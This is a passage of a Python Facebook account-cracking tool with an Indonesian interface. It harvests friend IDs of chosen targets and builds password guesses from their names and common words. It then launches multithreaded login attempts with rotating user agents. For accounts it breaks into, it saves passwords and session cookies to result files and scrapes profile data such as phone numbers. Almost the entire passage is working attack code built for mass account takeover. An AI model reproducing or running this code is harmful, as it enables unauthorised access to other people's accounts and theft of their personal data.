'Mozilla/5.0 (Linux; Android 10; CPH2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi 8A Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; JAT-LX1 Build/HONORJAT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91',
'Mozilla/5.0 (Linux; Android 11; A600DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G977B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A415F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/38.1  Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 12; id-id; 2107113SG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 12; ru-ru; M2101K7AG Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 6.0.1; pt-pt; M2102K1AC Build/V417IR) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; Redmi Go Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 12; en-us; V2040 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.7.2',
'Mozilla/5.0 (Linux; U; Android 12; pt-br; M2102J20SG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 8.0.0; es-sv; FLA-LX3 Build/HUAWEIFLA-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 10; ru-ru; JSN-L21 Build/HONORJSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 8.1.0; es-us; Redmi Go Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 10; ru-ru; MI 8 SE Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 12; uk-ua; M2101K7BNY Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 10; ru-ua; Mi A2 Lite Build/QKQ1.191002.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 4.4.4; id-id; 2014811 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 12; es-us; M2101K7AG Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 12; pt-br; SM-N986B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 12; ru-ru; SM-A315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 7.1.1; pt-br; ONEPLUS A5000 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 9; pt-br; moto g(6) plus Build/PPW29.116-16-29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 9; id-id; CPH2015 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 12; es-es; POCO F2 Pro Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 6.0.1; pt-pt; SM-G9910 Build/V417IR) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 9; en-ir; MRD-LX1F Build/HUAWEIMRD-LX1F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 12; pt-br; 2201117TG Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',
'Mozilla/5.0 (Linux; U; Android 9; pt-br; Moto Z3 Play Build/PPWS29.131-27-1-27) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3',]


# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
    os.system("xdg-open https://wa.me/6289604289872?text=assalamualaikum,+bang+gw+izin+make+scriptnya")
# BACK
def back():
    login()
# BANNER
def banner():
    clear()
    wel = '# WELCOME TO FACEBOOK  TOOLS 2022'
    wel2 = mark(wel, style='cyan')
    sol().print(wel2)
    au='AUTHOR    :  Bjorka-id\nGITHUB    :  https://github.com/Bjorka-id\nWHATSAPP  :  089604289872'
    pengembang1=nel(au,style="cyan")
    cetak(nel(pengembang1, title='INFORMASI PENGEMBANG'))

# VALIDASI TOKEN
def login():
        try:
            cok,token =open('.cok.txt','r').read(), open('.token.txt','r').read()
            tokenku.append(token)
            try:
                sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0], cookies={'cookie':cok})
                sy2 = json.loads(sy.text)['name']
                sy3 = json.loads(sy.text)['id']
                sy4 = json.loads(sy.text)['birthday']
                menu(sy2,sy3,sy4)
            except KeyError:
                login_lagi()
            except requests.exceptions.ConnectionError:
                banner()
                li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                lo = mark(li, style='red')
                sol().print(lo, style='cyan')
                exit()
        except IOError:
            login_lagi()

# LOGIN
def login_lagi():
    banner()
    sky = '# LOGIN MENGGUNAKAN COOKIES'
    sky2 = mark(sky, style='green')
    sol().print(sky2, style='cyan')
    panda2 = input(x+'['+p+'f'+x+'] Cookies : ')
    try :
        data = requests.get('https://business.facebook.com/business_locations', headers = {
            'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # don't change this user agent.
            'referer'                   : 'https://www.facebook.com/',
            'host'                      : 'business.facebook.com',
            'origin'                    : 'https://business.facebook.com',
            'upgrade-insecure-requests' : '1',
            'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control'             : 'max-age=0',
            'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type'              : 'text/html; charset=utf-8',
            'cookie':panda2 })
        panda = re.search('"(EAAG\w+)', data.text).group(1)
        akun=open('.token.txt','w').write(str(panda))
        akun=open('.cok.txt','w').write(panda2)
        tes = requests.get('https://graph.facebook.com/me?access_token='+panda, cookies={'cookie':panda2})
        tes3 = json.loads(tes.text)['id']
        sue = '# Login Sukses, Tunggu Sebentar!'
        suu = mark(sue, style='green')
        sol().print(suu, style='cyan')
        time.sleep(2.5)
        login()
    except requests.exceptions.ConnectionError:
        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
        lo = mark(li, style='red')
        sol().print(lo, style='cyan')
        exit()
    except Exception :
        sue = '# Login Gagal, Periksa Cookie Anda!'
        suu = mark(sue, style='red')
        sol().print(suu, style='cyan')
        time.sleep(2.5)
        login_lagi()
        
# MENU
def menu(my_name,my_id,my_birthday):
    try:sh = requests.get('https://httpbin.org/ip').json()
    except:sh = {'origin':'-'}
    try:
        tglx = my_birthday.split('/')[1]
        blnx = dic2[str(my_birthday.split('/')[0])]
        thnx = my_birthday.split('/')[2]
        birth = tglx+' '+blnx+' '+thnx
    except:birth = '-'
    banner()
    sg = '# MENU TOOLS'
    fx = mark(sg, style='green')
    sol().print(fx)
    print(x+'['+h+'•'+x+'] Active User : '+str(my_name))
    print(x+'['+h+'•'+x+'] User Id     : '+str(my_id))
    print(x+'['+h+'•'+x+'] User Ttl    : '+str(birth))
    print(x+'['+h+'•'+x+'] Ip Address  : '+str(sh['origin']))
    io = '[01] Crack Dari Pertemanan Publik\n[02] Crack Dari Pertemanan Publik (Massal)\n[03] Cek Result Crack\n[04] Cek Opsi Checkpoint\n[00] Log Out'
    oi = nel(io, style='cyan')
    cetak(nel(oi, title='MENU'))
    jh = input(x+'['+p+'<>'+x+'] Pilih : ')
    if jh in ['1','01']:
        dump_publik()
    elif jh in ['2','02']:
        dump_massal()
    elif jh in ['3','03']:
        result()
    elif jh in ['4','04']:
        file()
    elif jh in ['0','00']:
        os.system('rm -rf .token.txt')
        print(x+'['+h+'•'+x+'] Wait ...')
        time.sleep(1)
        sw = '# BERHASIL LOG OUT'
        sol().print(mark(sw, style='green'))
        exit()
    else:
        ric = '# PILIHAN TIDAK ADA DI MENU'
        sol().print(mark(ric, style='red'))
        exit()

# RESULT CHECKER
def result():
    cek = '# CEK RESULT CRACK'
    sol().print(mark(cek, style='green'))
    kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
    kis = nel(kayes, style='cyan')
    cetak(nel(kis, title='RESULTS'))
    kz = input(x+'['+p+'f'+x+'] Pilih : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            gada = '# DIREKTORI TIDAK DITEMUKAN'
            sol().print(mark(gada, style='red'))
            time.sleep(2)
            back()
        if len(vin)==0:
            haha = '# ANDA BELUM MEMILIKI RESULT CP'
            sol().print(mark(haha, style='yellow'))
            time.sleep(2)
            back()
        else:
            gerr = '# HASIL CP ANDA'
            sol().print(mark(gerr, style='green'))
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = '0'+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
            gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
            sol().print(mark(gerr2, style='green'))
            geeh = input(x+'['+p+'f'+x+'] Pilih : ')
            try:geh = lol[geeh]
            except KeyError:
                ric = '# PILIHAN TIDAK ADA DI MENU'
                sol().print(mark(ric, style='red'))
                exit()
            try:lin = open('CP/'+geh,'r').read()
            except:
                hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
                sol().print(mark(hehe, style='red'))
                time.sleep(2)
                back()
            akun = '# LIST AKUN CP ANDA'
            sol().print(mark(akun, style='green'))
            hus = os.system('cd CP && cat '+geh)
            akun2 = '# LIST AKUN CP ANDA'
            sol().print(mark(akun, style='green'))
            input(x+'['+h+'•'+x+'] Kembali')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            gada = '# DIREKTORI TIDAK DITEMUKAN'
            sol().print(mark(gada, style='red'))
            time.sleep(2)
            back()
        if len(vin)==0:
            haha = '# ANDA BELUM MEMILIKI RESULT OK'
            sol().print(mark(haha, style='yellow'))
            time.sleep(2)
            back()
        else:
            gerr = '# HASIL OK ANDA'
            sol().print(mark(gerr, style='green'))
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    nom = '0'+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
            gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
            sol().print(mark(gerr2, style='green'))
            geeh = input(x+'['+p+'f'+x+'] Pilih : ')
            try:geh = lol[geeh]
            except KeyError:
                ric = '# PILIHAN TIDAK ADA DI MENU'
                sol().print(mark(ric, style='red'))
                exit()
            try:lin = open('OK/'+geh,'r').read()
            except:
                hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
                sol().print(mark(hehe, style='red'))
                time.sleep(2)
                back()
            akun = '# LIST AKUN OK ANDA'
            sol().print(mark(akun, style='green'))
            hus = os.system('cd OK && cat '+geh)
            akun2 = '# LIST AKUN OK ANDA'
            sol().print(mark(akun, style='green'))
            input(x+'['+h+'•'+x+'] Kembali')
            back()
    elif kz in ['0','00']:
        back()
    else:
        ric = '# PILIHAN TIDAK ADA DI MENU'
        sol().print(mark(ric, style='red'))
        exit()

# OPEN
def file():
    tek = '# CEK OPSI DARI FILE'
    sol().print(mark(tek, style='cyan'), style='on red')
    print(x+'['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')
    time.sleep(2)
    teks = '# PILIH FILE YG AKAN DI CEK'
    sol().print(mark(teks, style='green'))
    my_files = []
    try:
        lis = os.listdir('CP')
        for kt in lis:
            my_files.append(kt)
    except:pass
    try:
        mer = os.listdir('OK')
        for ty in mer:
            my_files.append(ty)
    except:pass
    if len(my_files)==0:
        yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
        sol().print(mark(yy, style='red'))
        exit()
    else:
        cih = 0
        lol = {}
        for isi in my_files:
            try:hem = open('CP/'+isi,'r').readlines()
            except:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
            cih+=1
            if cih<10:
                nom = '0'+str(cih)
                lol.update({str(cih):str(isi)})
                lol.update({nom:str(isi)})
                print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
            else:
                lol.update({str(cih):str(isi)})
                print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
        teks2 = '# PILIH FILE YG AKAN DI CEK'
        sol().print(mark(teks2, style='green'))
        geeh = input(x+'['+p+'f'+x+'] Pilih : ')
        try:geh = lol[geeh]
        except KeyError:
            ric = '# PILIHAN TIDAK ADA DI MENU'
            sol().print(mark(ric, style='red'))
            exit()
        try:
            hf = open('CP/'+geh,'r').readlines()
            for fz in hf:
                akun.append(fz.replace('\n',''))
            cek_opsi()
        except IOError:
            try:
                hf = open('OK/'+geh,'r').readlines()
                for fz in hf:
                    akun.append(fz.replace('\n',''))
                cek_opsi()
            except IOError:
                hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
                sol().print(mark(hehe, style='red'))
                time.sleep(2)
                back()

# DUMP ID PUBLIK
def dump_publik():
    try:
        cok,token =open('.cok.txt','r').read(), open('.token.txt','r').read()
    except IOError:
        exit()
    win = '# DUMP ID PUBLIK'
    win2 = mark(win, style='green')
    sol().print(win2)
    print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
    pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
    try:
        koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies={'cookie':cok}).json()
        for pi in koh2['friends']['data']:
            try:id.append(pi['id']+'|'+pi['name'])
            except:continue
        print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
        lo = mark(li, style='red')
        sol().print(lo, style='cyan')
        exit()
    except (KeyError,IOError):
        teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
        teks2 = mark(teks, style='red')
        sol().print(teks2)
        exit()

# DUMP ID MASSAL
def dump_massal():
    cok=open('.cok.txt','r').read()
    win = '# DUMP ID PUBLIK MASSAL'
    win2 = mark(win, style='green')
    sol().print(win2)
    print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
    try:
        jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
    except ValueError:
        pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
        pesan2 = mark(pesan, style='red')
        sol().print(pesan2)
        exit()
    if jum<1 or jum>10:
        pesan = '# OUT OF RANGE MEN'
        pesan2 = mark(pesan, style='red')
        sol().print(pesan2)
        exit()
     
    ses=requests.Session()
    yz = 0
    print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
    for met in range(jum):
        yz+=1
        kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies={'cookie':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()
    tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
    if len(id)==0:
        tot2 = mark(tot, style='red')
    else:
        tot2 = mark(tot, style='green')
    sol().print(tot2)
    setting()

# PENGATURAN ID
def setting():
    wl = '# SETTING URUTAN ID'
    sol().print(mark(wl, style='green'))
    teks = '[01] Crack Dari Akun Tertua (Not Recommended)\n[02] Crack Dari Akun Termuda (Recommended)\n[03] Acak Urutan ID (Highly Recommended)'
    tak = nel(teks, style='cyan')
    cetak(nel(tak, title='SETTING'))
    hu = input(x+'['+p+'f'+x+'] Pilih : ')
    if hu in ['1','01']:
        for bacot in id:
            id2.append(bacot)
    elif hu in ['2','02']:
        for bacot in id:
            id2.insert(0,bacot)
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        ric = '# PILIHAN TIDAK ADA DI MENU'
        sol().print(mark(ric, style='red'))
        exit()
    met = '# PILIH METHOD CRACK'
    sol().print(mark(met, style='green'))
    ioz = '[01] Method B-Api (Fast)\n[02] Method Mobile (Slow)\n[03] Methode Free Facebook'
    gess = nel(ioz, style='cyan')
    cetak(nel(gess, title='METHOD'))
    hc = input(x+'['+p+'f'+x+'] Pilih : ')
    if hc in ['1','01']:
        method.append('api')
    elif hc in ['3','03']:
        method.append('free')
    else:
        method.append('mobile')
    guw = '# PILIHAN OPSI CRACK '
    sol().print(mark(guw, style='green'))
    aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi Tertaut ? (y/t) : ')
    if aplik in ['y','Y']:
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
    if osk in ['y','Y']:
        oprek.append('ya')
    else:
        oprek.append('no')
    passwrd()

# WORDLIST
def passwrd():
    ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
    sol().print(mark(ler, style='green'))
    krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
    cetak(nel(krek, title='CRACK'))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123']
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'api' in method:
                pool.submit(crack2,idf,pwv)
            elif 'free' in method:
                pool.submit(crack3,idf,pwv)
            else:
                pool.submit(crack,idf,pwv)
    print('')
    tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
    sol().print(mark(tanya, style='green'))
    woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
    if woi in ['y','Y']:
        cek_opsi()
    else:
        exit()

# CRACKER
def crack(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    print('\r%s<-> %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            tix = time.time()
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf+'|'+pw)
                    ceker(idf,pw)
                else:
                    print('\n')
                    statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='CP'))
                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akun.append(idf+'|'+pw)
                    cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
                if 'no' in taplikasi:
                    ok+=1
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    break
                elif 'ya' in taplikasi:
                    ok+=1
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                    user=idf
                    infoakun = ""
                    session = requests.Session()
                    get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
                    nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
                    response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
                    response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
                    response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
                    response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
                    try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
                    except:nomer = ""
